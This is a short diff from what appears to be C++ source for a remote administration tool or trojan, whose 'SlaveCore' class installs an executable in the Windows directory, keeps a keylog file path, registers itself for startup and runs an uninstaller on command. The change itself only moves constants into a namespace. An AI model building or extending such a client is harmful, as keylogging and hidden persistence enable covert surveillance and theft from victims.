@@ -5,7 +5,7 @@
 #include <system/Process.hpp>
 using namespace System;
 
-#include <blaspheme/Blaspheme.hpp>
+#include <Innocence.hpp>
 #include <blaspheme/transfer/FileTransfer.hpp>
 using namespace Blaspheme;
 
@@ -22,9 +22,9 @@ namespace Inhibition
     SlaveCore::SlaveCore(Blaspheme::ConnectionInfo info) : 
 		exited(false),
 		session(info),
-		installPath(System::getWindowsPath() + "\\" + INHIBITER_EXE_NAME),
-		keylogPath(System::getWindowsPath() + "\\" + KEYLOG),
-		dllPath(System::getWindowsPath() + "\\" + INHIBITION_DLL_NAME),
+		installPath(System::getWindowsPath() + "\\" + Innocence::INHIBITER_EXE_NAME),
+		keylogPath(System::getWindowsPath() + "\\" + Innocence::KEYLOG),
+		dllPath(System::getWindowsPath() + "\\" + Innocence::INHIBITION_DLL_NAME),
 		startup(installPath)
 	{
 		setConnection(info);
@@ -152,7 +152,7 @@ namespace Inhibition
         LOG << "Removing registry key";
         startup.uninstall();
         LOG << "Launching uninstaller";
-        System::Process::Launcher uninstaller(getInstallPath(), UNINSTALL_CMD);		
+        System::Process::Launcher uninstaller(getInstallPath(), Innocence::UNINSTALL_CMD);		
         exit();
         return true;
     }
